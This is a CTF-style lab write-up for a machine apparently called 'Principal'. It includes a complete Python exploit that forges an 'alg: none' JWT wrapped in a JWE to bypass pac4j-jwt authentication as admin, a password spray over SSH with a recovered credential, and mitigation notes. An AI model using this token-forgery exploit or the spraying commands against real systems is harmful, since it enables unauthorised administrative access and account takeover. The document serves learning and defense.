# Principal Writeup

---

## 1. Enumeration

### Nmap Scan

```bash
sudo nmap -p- -sC -sV --min-rate 1000 10.129.9.126
```

**Explanation**

- `-p-` scans all ports  
- `-sC` runs default scripts  
- `-sV` detects service versions  
- `--min-rate 1000` speeds up the scan  

The scan revealed multiple open ports, including an HTTP service running on port **8080**.

Accessing the web service showed a web application with authentication functionality.

---

## 2. Initial Access (User Flag)

### JavaScript Analysis

```bash
view-source:http://10.129.9.126:8080/static/js/app.js
```

The following endpoint was discovered:

```javascript
const JWKS_ENDPOINT = '/api/auth/jwks';
```

This suggests the application uses JWT-based authentication.

---

### JWKS Retrieval

```bash
curl http://10.129.9.126:8080/api/auth/jwks | jq
```

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtB..."
    }
  ]
}
```

The server exposes its RSA public key.

---

### Technology Identification

The application likely uses pac4j and pac4j-jwt for authentication.

---

## 3. Vulnerability Identification

### CVE-2026-29000

A vulnerability in pac4j-jwt allows authentication bypass.

**Conditions for exploitation:**

1. Vulnerable pac4j-jwt version  
2. Public key exposure via JWKS  

Both conditions are satisfied.

---

## 4. Exploitation

### Attack Overview

```
JWE (encrypted token)
 → server decrypts
   → extracts inner JWT
     → signature validation bypass (alg: none)
```

---

### Exploit Code

```python
#!/usr/bin/env python3

import json
import base64
from jwcrypto import jwe, jwk
from time import time
import requests

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

key_data = {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "enc-key-1",
    "n": "lTh54vtB..."
}

header = {"alg": "none"}
now = int(time())

payload = {
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}

pub_key = jwk.JWK(**key_data)

json_header = json.dumps(header, separators=(",", ":")).encode()
json_payload = json.dumps(payload, separators=(",", ":")).encode()

segments = [
    base64.urlsafe_b64encode(json_header).rstrip(b'=').decode(),
    base64.urlsafe_b64encode(json_payload).rstrip(b'=').decode()
]

plain_jwt = ".".join(segments) + "."

jwe_token = jwe.JWE(
    plaintext=plain_jwt.encode(),
    recipient=pub_key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": "enc-key-1",
        "cty": "JWT"
    })
)

forged_token = jwe_token.serialize(compact=True)

headers = {"Authorization": f"Bearer {forged_token}"}
resp = requests.get("http://10.129.9.126:8080/api/settings", headers=headers)

with open("output.json", "w") as f:
    json.dump(resp.json(), f, indent=2)
```

---

### Result

- Authentication bypass successful  
- Admin access achieved  
- Credentials retrieved  

---

## 5. User Enumeration & Access

### Retrieve Users

```bash
curl -H "Authorization: Bearer <token>" \
http://10.129.9.126:8080/api/users | jq
```

---

### Extract Usernames

```bash
jq -r '.users[].username' users.json > users.txt
```

---

### Password Spray

```bash
nxc ssh 10.129.9.126 -u users.txt -p 'D3pl0y_$$H_Now42!'
```

Valid credentials found:

```
svc-deploy : D3pl0y_$$H_Now42!
```

---

### SSH Login

```bash
ssh svc-deploy@10.129.9.126
```

User flag location:

```
/home/svc-deploy/user.txt
```
[+] get user flag!! [+]
---

## Privilage Escalation

---

## 7. What We Learned
## CVE-2026-29000: pac4j-jwt Authentication Bypass

**Description:**  
CVE-2026-29000 is a critical vulnerability in the **pac4j-jwt** library (versions prior to 4.5.9, 5.7.9, 6.3.3) that allows attackers to bypass JWT authentication.

**Root Cause:**  
- The library incorrectly handles JWTs with `"alg": "none"`.  
- When receiving a token with `"alg": "none"`, the server may skip signature verification.  
- If an attacker knows the server's RSA public key (e.g., from a JWKS endpoint), they can craft a **valid JWE token containing a forged JWT**.  
- The server decrypts the JWE, sees the inner JWT, and incorrectly trusts it, allowing **privilege escalation**.

**Impact:**  
- Attackers can gain **admin privileges** without knowing any secret keys.  
- Fully bypass authentication in affected applications using pac4j-jwt.

**Mitigation:**  
1. Upgrade pac4j-jwt to **≥ 4.5.9, 5.7.9, or 6.3.3** depending on the major version.  
2. **Reject `alg: none` tokens** explicitly.  
3. Always verify the signature **after decryption** of nested JWTs (JWE → JWS).  
4. Validate claims like `iss`, `exp`, and `role` server-side rather than trusting client-supplied JWT data.

**References:**  
- [Snyk Advisory on pac4j-jwt](https://snyk.io/jp/articles/public-key-breaks-authentication-pac4j-jwt/)
---
